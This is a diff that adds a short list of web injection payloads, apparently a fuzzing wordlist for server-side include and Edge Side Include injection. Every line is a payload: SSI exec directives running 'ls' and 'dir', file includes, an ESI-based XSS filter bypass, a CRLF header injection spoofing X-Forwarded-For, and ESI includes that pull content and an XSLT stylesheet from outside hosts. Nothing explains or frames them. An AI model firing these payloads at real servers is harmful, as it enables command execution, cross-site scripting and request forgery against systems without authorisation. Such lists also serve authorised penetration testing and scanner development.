@@ -1,0 +1,11 @@
+<!--#echo var="DATE_LOCAL" -->
+<!--#exec cmd="ls" -->
+<esi:include src=http://google.com/>
+x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#include virtual="/index.html" -->
+<!--#exec cmd="dir" -->
+<esi:include src="http://google.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
+<esi:debug/>
+<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://google.com/poc.xsl" />
